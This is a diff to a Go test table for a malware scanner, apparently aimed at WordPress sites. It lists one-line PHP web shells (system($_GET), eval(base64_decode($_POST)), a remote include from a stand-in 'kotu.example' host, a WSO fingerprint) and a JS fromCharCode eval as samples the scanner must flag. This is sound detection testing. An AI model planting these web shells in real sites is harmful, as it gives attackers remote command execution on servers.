@@ -52,7 +52,7 @@ func TestZararliYakalanir(t *testing.T) {
 		{"system+GET", "c.php", `<?php system($_GET['cmd']); ?>`, EsikKritik},
 		{"degisken fonksiyon", "d.php", `<?php $f($_REQUEST['x']); ?>`, EsikKritik},
 		{"uzak include", "e.php", `<?php include("http://kotu.example/x.txt"); ?>`, EsikKritik},
-		{"uploads altinda php", "wp-content/uploads/2026/x.php", `<?php echo 1;`, EsikKritik},
+		{"uploads altinda webshell", "wp-content/uploads/2026/x.php", `<?php eval(base64_decode($_POST['c']));`, EsikKritik},
 		{"cift uzanti", "resim.jpg.php", `<?php echo 1;`, EsikSupheli},
 		{"webshell parmak izi", "f.php", `<?php // WSO 2.5 FilesMan`, EsikKritik},
 		{"js fromCharCode", "g.js", `eval(String.fromCharCode(97,98));`, EsikKritik},
